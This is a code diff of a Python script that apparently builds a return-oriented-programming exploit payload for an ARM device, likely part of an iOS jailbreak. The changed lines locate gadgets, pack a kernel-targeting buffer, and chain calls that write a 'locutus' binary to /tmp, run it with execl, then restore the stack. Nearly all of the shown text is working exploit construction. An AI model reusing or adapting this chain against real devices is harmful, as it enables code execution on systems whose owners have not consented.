@@ -31,7 +31,7 @@ popdude = dmini.cur.find_multiple('+ a7 f1 14 0d bd e8 00 05 f0 bd', '?')
 dmini.init(shlex.split(sys.argv[1]))
 
 ldm, stub, num_before_r0, num_after_r0 = dmini.cur.find_ldms(0x14414114)
-print hex(ldm), hex(stub), num_before_r0, num_after_r0
+#print hex(ldm), hex(stub), num_before_r0, num_after_r0
 
 kernstuff = ([dontcare] * num_before_r0) + [0xffffffff] + ([dontcare] * num_after_r0) + [popdude, mcrdude]
 kernstuff = struct.pack('I'*len(kernstuff), *kernstuff)
@@ -40,8 +40,18 @@ kernstuff += '\0' * ((-len(kernstuff) & 0xfff) + (stub & 0xfff))
 
 plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)
 
-init('PC')
-make_avail()
+init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
+
+# btw
+locutus_len = os.path.getsize('../../locutus/locutus')
+
+# r0 came from stub.py
+out_sp, out_spp = stackunkpair()
+locutus, locutusp = stackunkpair()
+store_r0_to(out_spp)
+add_r0_by(0x558 - 0x624) # subrs, minus the offset we already added :psyduck:
+load_r0_r0()
+store_r0_to(locutusp)
 
 # before we remap, save 0x1000 so we can have it back
 
@@ -115,15 +125,23 @@ funcall('_vm_allocate', mtss.pop(), zerop, 0x1000, 0)
 funcall('_vm_protect', mtss.pop(), 0, 0x1000, 0, 0)
 funcall('_vm_map', mtss.pop(), thousandp, 0x1000, 1, 0, memory_entry, 0, 0, 5, 5, 2)
 
-funcall('_exit', 0)
+O_WRONLY = 0x0001
+O_CREAT  = 0x0200
+O_TRUNC  = 0x0400
 
-final = finalize(0xfefe0000)
+locutus_str = ptr('/tmp/locutus', True)
+funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
+fd, fdp = stackunkpair()
+store_r0_to(fdp)
+funcall('_write', None, locutus, locutus_len)
+funcall('_close', fd)
+funcall('_execl', locutus_str, locutus_str, 0)
 
-final = zlib.compress(final)
+fancy_set_sp_to(out_sp)
 
-print 'len(final) = %d/1024' % len(final)
-print repr(goo.sheap)
+final = finalize(0x11000000)
 
+#final = zlib.compress(final)
 #heapdump(None)
 open('output.txt', 'w').write(final)
 
